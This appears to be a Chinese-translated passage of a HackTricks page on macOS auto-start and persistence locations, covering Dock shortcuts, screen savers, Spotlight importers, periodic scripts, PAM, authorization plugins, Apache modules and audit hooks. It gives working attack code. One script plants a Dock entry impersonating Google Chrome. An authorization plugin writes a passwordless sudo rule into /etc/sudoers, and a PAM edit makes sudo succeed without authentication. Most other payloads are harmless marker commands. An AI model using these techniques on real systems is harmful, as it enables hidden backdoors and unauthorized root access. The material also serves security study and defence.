### Dock 快捷方式

写作：[https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* 有助于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)
* 但你需要在系统内安装了一个恶意应用程序

#### 位置

* `~/Library/Preferences/com.apple.dock.plist`
* **触发器**：当用户点击 dock 中的应用程序时

#### 描述与利用

Dock 中出现的所有应用程序都在 plist 中指定：**`~/Library/Preferences/com.apple.dock.plist`**

只需以下操作即可**添加应用程序**：

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

利用一些**社会工程学**技巧，你可以在dock中**冒充例如Google Chrome**，实际上执行你自己的脚本：
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### 颜色选择器

写作：[https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* 有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 需要发生一个非常特定的动作
* 你将进入另一个沙箱

#### 位置

* `/Library/ColorPickers`&#x20;
* 需要根权限
* 触发器：使用颜色选择器
* `~/Library/ColorPickers`
* 触发器：使用颜色选择器

#### 描述与利用

**编译一个包含你代码的颜色选择器** 包（你可以使用[**这个例子**](https://github.com/viktorstrate/color-picker-plus))，添加一个构造函数（如[屏幕保护程序部分](macos-auto-start-locations.md#screen-saver)所述），并将包复制到 `~/Library/ColorPickers`。

然后，当触发颜色选择器时，你的代码也应该被触发。

注意，加载你库的二进制文件有一个**非常限制性的沙箱**：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder 同步插件

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* 用于绕过沙箱：**不，因为你需要执行自己的应用程序**

#### 位置

* 一个特定的应用程序

#### 描述与利用

一个带有 Finder 同步扩展的应用程序示例[**可以在这里找到**](https://github.com/D00MFist/InSync)。

应用程序可以有 `Finder 同步扩展`。这个扩展将进入将要执行的应用程序内部。此外，为了让扩展能够执行其代码，它**必须使用**某个有效的苹果开发者证书进行签名，它必须是**沙箱化的**（尽管可以添加放宽的例外）并且必须使用类似以下方式注册：
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### 屏幕保护程序

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* 有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但你最终会进入一个常见的应用程序沙箱

#### 位置

* `/System/Library/Screen Savers`&#x20;
* 需要根权限
* **触发器**：选择屏幕保护程序
* `/Library/Screen Savers`
* 需要根权限
* **触发器**：选择屏幕保护程序
* `~/Library/Screen Savers`
* **触发器**：选择屏幕保护程序

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### 描述与利用

在Xcode中创建一个新项目，并选择模板以生成一个新的**屏幕保护程序**。然后，向其中添加你的代码，例如以下代码以生成日志。

**构建**它，并将`.saver`包复制到**`~/Library/Screen Savers`**。然后，打开屏幕保护程序GUI，如果你点击它，它应该会生成大量日志：

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
请注意，由于在加载此代码的二进制文件的权限集中（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）可以找到 **`com.apple.security.app-sandbox`**，您将处于**通用应用程序沙盒**中。
{% endhint %}

屏幕保护程序代码：
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight 插件

有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)

* 但你将进入应用程序沙箱

#### 位置

* `~/Library/Spotlight/`
* **触发器**：创建了一个由 spotlight 插件管理的扩展名的新文件。
* `/Library/Spotlight/`
* **触发器**：创建了一个由 spotlight 插件管理的扩展名的新文件。
* 需要根权限
* `/System/Library/Spotlight/`
* **触发器**：创建了一个由 spotlight 插件管理的扩展名的新文件。
* 需要根权限
* `Some.app/Contents/Library/Spotlight/`
* **触发器**：创建了一个由 spotlight 插件管理的扩展名的新文件。
* 需要新应用程序

#### 描述与利用

Spotlight 是 macOS 内置的搜索功能，旨在为用户提供**快速全面地访问计算机上的数据**。\
为了促进这种快速搜索能力，Spotlight 维护了一个**专有数据库**并通过**解析大多数文件**创建索引，使得能够快速搜索文件名及其内容。

Spotlight 的底层机制涉及一个名为 'mds' 的中央进程，代表**'元数据服务器'**。这个进程协调整个 Spotlight 服务。补充这一点的是多个 'mdworker' 守护进程，它们执行各种维护任务，例如索引不同文件类型（`ps -ef | grep mdworker`）。这些任务通过 Spotlight 导入插件，或**".mdimporter 包"**，使得 Spotlight 能够理解和索引各种不同的文件格式。

插件或 **`.mdimporter`** 包位于前面提到的位置，如果出现新的包，它会在一分钟内被加载（无需重启任何服务）。这些包需要指明它们可以管理的**文件类型和扩展名**，这样，当创建了指定扩展名的新文件时，Spotlight 将使用它们。

可以通过运行以下命令**找到所有加载的 `mdimporters`**：
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例如，**/Library/Spotlight/iBooksAuthor.mdimporter** 用于解析这些类型的文件（扩展名包括 `.iba` 和 `.book` 等）：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
如果您检查其他 `mdimporter` 的 Plist，您可能找不到条目 **`UTTypeConformsTo`**。这是因为它是内置的_统一类型标识符_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))，不需要指定扩展名。

此外，系统默认插件始终优先，因此攻击者只能访问苹果自己的 `mdimporters` 未索引的文件。
{% endhint %}

要创建您自己的导入器，您可以从这个项目开始：[https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)，然后更改名称、**`CFBundleDocumentTypes`** 并添加 **`UTImportedTypeDeclarations`**，以便它支持您想要支持的扩展名，并在 **`schema.xml`** 中反映它们。\
然后**更改**函数 **`GetMetadataForFile`** 的代码，以便在创建具有处理扩展名的文件时执行您的有效载荷。

最后，**构建并复制您的新 `.mdimporter`** 到前面的位置之一，您可以通过**监控日志**或检查 **`mdimport -L.`** 来检查它何时被加载。

### ~~首选项面板~~

{% hint style="danger" %}
看起来这已经不再起作用了。
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

* 有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 它需要特定的用户操作

#### 位置

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### 描述

看起来这已经不再起作用了。

## Root 沙箱绕过

{% hint style="success" %}
在这里，您可以找到有助于**沙箱绕过**的启动位置，它允许您通过将某些内容**写入文件**来简单地执行某些操作，这需要**root**权限和/或其他**奇怪的条件**。
{% endhint %}

### 定期

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

* 有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但您需要是 root

#### 位置

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* 需要 root 权限
* **触发器**：时间到了
* `/etc/daily.local`, `/etc/weekly.local` 或 `/etc/monthly.local`
* 需要 root 权限
* **触发器**：时间到了

#### 描述与利用

定期脚本（**`/etc/periodic`**）是因为 `/System/Library/LaunchDaemons/com.apple.periodic*` 中配置的**启动守护进程**而执行的。请注意，存储在 `/etc/periodic/` 中的脚本是作为**文件所有者**执行的，所以这不适用于潜在的权限提升。

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

还有其他周期性脚本将会执行，这些脚本在 **`/etc/defaults/periodic.conf`** 中指明：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
如果您成功写入 `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local` 任一文件，它将**迟早被执行**。

{% hint style="warning" %}
请注意，周期性脚本将**以脚本所有者的身份执行**。因此，如果普通用户拥有该脚本，它将以该用户的身份执行（这可能会防止提权攻击）。
{% endhint %}

### PAM

写作：[Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
写作：[https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* 有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但您需要是 root

#### 位置

* 始终需要 root

#### 描述与利用

由于 PAM 更侧重于**持久性**和恶意软件，而不是在 macOS 内部的简易执行，本博客不会详细解释，**阅读写作以更好地理解这项技术**。

检查 PAM 模块：
```bash
ls -l /etc/pam.d
```
```markdown
持久性/权限提升技术滥用PAM就像修改模块 /etc/pam.d/sudo，在开头添加以下行一样简单：
```
```bash
auth       sufficient     pam_permit.so
```
所以它会**看起来**像这样：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
因此，任何尝试使用 **`sudo` 将会生效**。

{% hint style="danger" %}
请注意，这个目录受到 TCC 保护，因此用户很可能会收到提示，要求访问权限。
{% endhint %}

### 授权插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* 有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但你需要 root 权限并进行额外配置

#### 位置

* `/Library/Security/SecurityAgentPlugins/`
* 需要 root 权限
* 还需要配置授权数据库以使用插件

#### 描述与利用

你可以创建一个授权插件，当用户登录时执行，以维持持久性。有关如何创建这些插件的更多信息，请查看前面的 writeups（小心，一个编写不当的插件可能会锁定你的账户，你将需要从恢复模式清理你的 mac）。
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**将** bundle 移动到要加载的位置：
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最后添加**规则**以加载此插件：
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
The **`evaluate-mechanisms`** 将告诉授权框架它需要**调用外部机制进行授权**。此外，**`privileged`** 将使其由 root 执行。

使用以下方法触发：
```bash
security authorize com.asdf.asdf
```
然后**staff 组应该有 sudo** 访问权限（阅读 `/etc/sudoers` 以确认）。

### Man.conf

写作：[https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* 有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但你需要是 root 并且用户必须使用 man

#### 位置

* **`/private/etc/man.conf`**
* 需要 root 权限
* **`/private/etc/man.conf`**：每当使用 man 时

#### 描述与利用

配置文件 **`/private/etc/man.conf`** 指示打开 man 文档文件时使用的二进制/脚本。因此，可执行文件的路径可以被修改，这样每当用户使用 man 阅读某些文档时，就会执行一个后门。

例如，在 **`/private/etc/man.conf`** 中设置：
```
MANPAGER /tmp/view
```
然后创建 `/tmp/view` 如下：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* 用于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但你需要是root用户且apache需要在运行中

#### 位置

* **`/etc/apache2/httpd.conf`**
* 需要root权限
* 触发条件：当Apache2启动时

#### 描述与利用

你可以在/etc/apache2/httpd.conf中指示加载一个模块，添加如下行：

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

这样，您编译的模块将被Apache加载。唯一的要求是，您需要使用有效的Apple证书**对其签名**，或者在系统中**添加一个新的受信任证书**并用它**进行签名**。

然后，如果需要，为确保服务器将启动，您可以执行：
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
代码示例用于 Dylb：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM 审计框架

写作：[https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* 用于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但你需要是 root 用户，auditd 正在运行并且引发警告

#### 位置

* **`/etc/security/audit_warn`**
* 需要 root 权限
* **触发器**：当 auditd 检测到警告时

#### 描述与利用

每当 auditd 检测到警告时，脚本 **`/etc/security/audit_warn`** 将被**执行**。因此，你可以在其中添加你的有效载荷。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
你可以使用 `sudo audit -n` 强制出现一个警告。

### 启动项

{% hint style="danger" %}
**这已经被弃用，所以在以下目录中不应该找到任何东西。**
{% endhint %}

一个 **StartupItem** 是一个被**放置**在以下两个文件夹中的一个**目录**。`/Library/StartupItems/` 或 `/System/Library/StartupItems/`

在这两个位置中的一个放置了一个新目录后，需要在该目录内再放置**两个更多的项目**。这两个项目是一个 **rc 脚本** **和一个包含一些设置的 plist**。这个 plist 必须被称为“**StartupParameters.plist**”。

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
我在我的 macOS 中找不到这个组件，想要了解更多信息请查看 writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

苹果引入了一个名为 **emond** 的日志机制。看起来它从未被完全开发，而且开发可能已经被苹果 **放弃** 以支持其他机制，但它仍然是 **可用的**。

这个鲜为人知的服务对于 Mac 管理员来说 **可能没什么用**，但对于威胁行为者来说，一个非常好的理由是将其用作 **大多数 macOS 管理员可能不会知道查找的持久性机制**。检测 emond 的恶意使用不应该难，因为服务的 System LaunchDaemon 只在一个地方查找要运行的脚本：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

写作：[https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### 位置

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* 需要根权限
* **触发器**：使用XQuartz

#### 描述 & 漏洞利用

XQuartz **不再安装在macOS中**，如果你想了解更多信息，请查看写作。

### ~~kext~~

{% hint style="danger" %}
安装kext即使作为root也非常复杂，我不会考虑使用它来逃离沙箱或者用于持久性（除非你有一个漏洞）
{% endhint %}

#### 位置

为了将KEXT作为启动项安装，它需要被**安装在以下位置之一**：

* `/System/Library/Extensions`
* 内置于OS X操作系统的KEXT文件。
* `/Library/Extensions`
* 第三方软件安装的KEXT文件

你可以列出当前加载的kext文件，使用：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
有关[**内核扩展的更多信息，请查看本节**](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers)。

### ~~amstoold~~

写作分析：[https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### 位置

* **`/usr/local/bin/amstoold`**
* 需要根权限

#### 描述与利用

显然，`/System/Library/LaunchAgents/com.apple.amstoold.plist` 中的 `plist` 在使用这个二进制文件时暴露了一个XPC服务...问题是二进制文件不存在，所以你可以放置一些东西在那里，当XPC服务被调用时你的二进制文件将被执行。

我在我的macOS中再也找不到这个了。

### ~~xsanctl~~

写作分析：[https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### 位置

* **`/Library/Preferences/Xsan/.xsanrc`**
* 需要根权限
* **触发条件**：当服务运行时（很少见）

#### 描述与利用

显然，运行这个脚本并不常见，我甚至在我的macOS中找不到它，所以如果你想要更多信息，请查看写作分析。

### ~~/etc/rc.common~~

{% hint style="danger" %}
**在现代MacOS版本中不再适用**
{% endhint %}

在这里也可以放置**将在启动时执行的命令。** 常规rc.common脚本的示例：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 持久性技术和工具

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？你想在**HackTricks**中看到你的**公司广告**吗？或者你想要访问**最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏。
* 获取[**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注**我。
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
